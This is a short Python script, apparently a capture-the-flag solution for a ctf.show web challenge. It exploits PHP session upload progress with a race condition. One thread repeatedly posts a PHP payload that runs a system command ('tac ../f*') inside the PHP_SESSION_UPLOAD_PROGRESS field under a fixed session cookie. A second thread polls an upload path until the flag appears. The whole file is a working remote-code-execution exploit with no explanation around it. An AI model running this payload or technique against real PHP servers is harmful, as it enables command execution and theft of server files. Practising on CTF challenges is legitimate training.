import io
import requests
import threading

session = requests.Session()
sess = 'ruiwenya'
url1 = "http://15af0929-7de9-40aa-aae3-e1feb45e6c39.chall.ctf.show/"
url2 = "http://15af0929-7de9-40aa-aae3-e1feb45e6c39.chall.ctf.show/upload/"
data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
}
file = {
    'upload': ('test.txt', io.BytesIO(b'a' * 1024 * 50))
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url1, data=data1, files=file, cookies=cookies)
        # print(r.status_code)


def read():
    while True:
        r = session.get(url2)
        if 'flag' in r.text:
            print(r.text)


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()

